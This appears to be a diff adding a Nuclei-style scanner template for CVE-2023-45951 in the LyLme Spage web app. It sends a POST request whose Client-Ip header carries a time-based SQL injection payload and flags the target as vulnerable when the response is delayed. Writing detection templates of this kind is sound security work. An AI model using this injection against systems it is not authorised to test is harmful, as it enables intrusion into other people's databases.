@@ -1,0 +1,35 @@
+id: lylme-ClientIp-sqli
+
+info:
+  name: lylme-ClientIp-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://github.com/ATonysan/poc-exp/blob/main/LyLme_Spage_CVE-2023-45951_SQL.py
+  tags: tags
+
+variables:
+  random_str: "{{rand_base(5)}}"
+
+
+http:
+  - raw:
+      - |-
+        POST /apply/index.php?submit=post HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Client-Ip: 0'>if(1,sleep(5),2)>'
+        Content-Length: 67
+
+        url=http%3A%2F%2{{random_str}}.com&name=test&group_id=1&icon=&authcode=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+        condition: and
